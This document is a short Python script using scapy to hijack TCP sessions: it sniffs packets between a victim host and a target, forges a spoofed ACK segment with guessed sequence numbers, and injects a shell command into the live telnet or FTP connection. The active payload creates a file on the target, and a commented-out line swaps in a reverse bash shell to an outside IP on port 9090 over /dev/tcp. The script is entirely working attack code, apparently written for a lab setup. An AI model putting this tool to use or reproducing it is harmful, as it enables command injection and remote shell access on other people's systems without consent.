#!usr/bin/python3
import sys
from scapy.all import *
def spoof(pkt):
      # work best in telnet and ftp connections....
      print("=====================injection started====================")
      oldtcp = pkt[TCP]
      #newseq = oldtcp.seq + len(pkt) + 20
      newseq = oldtcp.seq + 10
      newack = oldtcp.ack + 1
      ip = IP(src=anothervictim,dst=targetip)
      tcp=TCP(sport=oldtcp.sport,dport=oldtcp.dport,flags="A",seq=newseq,ack=newack)
      #data="\ntouch /home/msfadmin/sessionhijacking.txt\n"
      data="\ntouch /home/sessionhijacking.txt\n"
      #data = "\n/bin/bash -i >/dev/tcp/192.68.43.224/9090 0<&1 2>&1\n"
      packet = ip/tcp/data
      ls(packet)
      send(packet,verbose=0)
      
      print("==================injection done=========================")
      quit()
      
      
targetip = input("Target IP: ")
anothervictim = input("Another Victim IP: ") 
iface = input("Network Interface you are using currently e.g. usb,wlo1,eth0: ")
myfilter = 'tcp and src host '+anothervictim+' and dst host '+targetip
sniff(iface=iface,filter="(ip src "+anothervictim+" and ip dst "+targetip + ")",prn=spoof)
